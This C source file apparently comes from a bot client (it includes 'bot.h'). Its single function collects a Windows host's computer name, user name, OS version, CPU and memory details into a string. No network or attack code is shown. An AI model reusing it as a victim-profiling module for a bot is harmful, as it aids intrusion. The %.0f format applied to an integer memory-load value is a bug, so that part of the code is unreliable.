#include "bot.h"

// 收集系统信息
char* collect_system_info() {
    char *info = (char*)malloc(2048);
    if (!info) return NULL;

    // 系统信息
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    
    // 内存信息
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    
    // 计算机名
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);
    
    // 用户名
    char userName[256];
    DWORD userNameSize = sizeof(userName);
    GetUserNameA(userName, &userNameSize);
    
    // OS版本
    OSVERSIONINFOEX osInfo;
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((OSVERSIONINFO*)&osInfo);
    
    // 处理器信息
    int CPUInfo[4] = {-1};
    char CPUBrand[0x40] = {0};
    __cpuid(CPUInfo, 0x80000002);
    memcpy(CPUBrand, CPUInfo, sizeof(CPUInfo));
    __cpuid(CPUInfo, 0x80000003);
    memcpy(CPUBrand + 16, CPUInfo, sizeof(CPUInfo));
    __cpuid(CPUInfo, 0x80000004);
    memcpy(CPUBrand + 32, CPUInfo, sizeof(CPUInfo));
    
    // 格式化系统信息
    _snprintf_s(info, 2048, _TRUNCATE,
                "Computer: %s\n"
                "Username: %s\n"
                "OS: %d.%d.%d (%s)\n"
                "Arch: %s\n"
                "CPU: %s\n"
                "CPUs: %d\n"
                "Memory: %I64dMB/%I64dMB (%.0f%% used)\n",
                computerName, userName,
                osInfo.dwMajorVersion, osInfo.dwMinorVersion, osInfo.dwBuildNumber,
                (osInfo.wProductType == VER_NT_WORKSTATION) ? "Workstation" : "Server",
                (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" : 
                (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) ? "ARM64" : "x86",
                CPUBrand,
                sysInfo.dwNumberOfProcessors,
                (memInfo.ullTotalPhys - memInfo.ullAvailPhys) / (1024 * 1024),
                memInfo.ullTotalPhys / (1024 * 1024),
                memInfo.dwMemoryLoad);
    
    return info;
}